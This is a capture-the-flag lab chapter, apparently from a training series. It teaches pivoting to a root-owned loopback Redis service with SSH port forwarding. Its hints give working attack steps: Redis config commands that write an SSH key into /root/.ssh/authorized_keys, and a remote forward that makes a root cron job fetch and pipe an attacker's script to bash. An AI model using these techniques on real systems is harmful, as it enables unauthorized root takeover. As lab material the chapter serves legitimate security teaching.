# Chapter 07 — "Local Service + Port Forwarding"  ·  Pivoting to a loopback service

> **Host:** `hollow-relay-01` (compose service `target-pivot`)
> **Foothold:** `labuser1 : password123`
> **Objective:** become **root** and read `/root/flag.txt`
> **Difficulty:** ★★★☆ (the win isn't on your shell — you have to reach for it)

---

## Mission brief

`sudo -l` is empty. No odd SUID, no capabilities. Enumeration of the *host* is
a dead end — because the vulnerable thing isn't a file, it's a **service**. This
box runs Redis bound to `127.0.0.1`, with no password, **as root**. The admins
figured loopback-only meant unreachable.

It isn't. Loopback-only stops a *remote* client. It does nothing against someone
who already has a shell and can **forward a port** to it. Open an SSH tunnel
from your attacker box straight to the target's `127.0.0.1:6379`, and now your
`redis-cli` is talking to a root-owned Redis — which can write any file on disk.

> **The whole idea in one line:** a service on `127.0.0.1` is not safe from
> someone with a shell — `ssh -L` turns the target's loopback into *your*
> loopback.

---

## Objective and rules

- **Win condition:** read `/root/flag.txt`. Flag format: `R2R{...}`.
- **In scope:** this container only.
- **Connect:** from the attacker box, `ssh labuser1@target-pivot` (password `password123`).
  Or `docker exec -it -u labuser1 target-pivot bash`.
- Two write primitives, one tunnel. Either wins.

---

## Recon starter

```bash
# on the target, as labuser1:
ss -tlnp            # what's listening, and on which interface?
# 127.0.0.1:6379 -> Redis, loopback only
```

A service bound to `127.0.0.1` that you can't reach from outside is exactly the
thing port forwarding is for.

---

## Two services, two forwarding directions

From the **attacker** box (not the target):

```bash
# -L  LOCAL forward: pull the TARGET's loopback service to YOU
ssh -L 6379:127.0.0.1:6379 labuser1@target-pivot
redis-cli -h 127.0.0.1 -p 6379 ping        # PONG — root's Redis

# -R  REMOTE forward: push one of YOUR services onto the TARGET's loopback
python3 -m http.server 8000                 # your payload server
ssh -R 9000:127.0.0.1:8000 labuser1@target-pivot
```

`-L <lport>:<host>:<port>` makes your SSH client listen on `<lport>` and forward
through the session to `<host>:<port>` **as seen from the target**. `-R` is the
mirror: the *target* listens on a port and forwards back to a service on **your**
side.

---

## Stations

| Station | Forward | The service | Win |
|---|---|---|---|
| A | `-L` local | root Redis on `127.0.0.1:6379` | make it write `/root/.ssh/authorized_keys` → `ssh root@` |
| B | `-R` remote | a root updater that fetches `http://127.0.0.1:9000/` | publish your script there → root runs it |

---

## Hints

<details><summary>Station A — local forward → Redis → authorized_keys</summary>

Open the `-L` forward, then drive Redis:
```
redis-cli -h 127.0.0.1 -p 6379
> config set dir /root/.ssh
> config set dbfilename authorized_keys
> set x "\n\n<your ssh public key>\n\n"
> save
```
`SAVE` dumps to `<dir>/<dbfilename>`. The RDB file has binary header/footer
bytes, so pad your key with blank lines — sshd skips the garbage and reads your
key. Then `ssh -i yourkey root@target-pivot`.

</details>

<details><summary>Station B — remote forward → the updater runs your script</summary>

`cat /etc/cron.d/rtr-updater`: root fetches `http://127.0.0.1:9000/payload.sh`
every minute and pipes it to bash. Nothing listens on `:9000` — so put something
there. Serve a `payload.sh` on your attacker box (`python3 -m http.server
8000`), then `ssh -R 9000:127.0.0.1:8000 labuser1@target-pivot`. Now the
target's `127.0.0.1:9000` is *your* server; root downloads and runs your script.

</details>

<details><summary>Dynamic forwarding and no-SSH options</summary>

`-D <port>` makes a SOCKS proxy for reaching a whole subnet behind the target
(`proxychains`, `curl --socks5`). No SSH on the box? **chisel** and **socat** do
the same `-L`/`-R` forwards. The debrief has all of it.

</details>

---

## Capture

```bash
# Station A:
ssh -i yourkey root@target-pivot 'id; cat /root/flag.txt'
# Station B (your payload copied it out):
ssh labuser1@target-pivot cat /tmp/flag
```

The debrief — the Redis-as-root mechanic, `-L` / `-R` / `-D` forwarding, chisel
for when you have no SSH, detection, and the fix — is in [WRITEUP.md](WRITEUP.md).
Try the box before you open it.
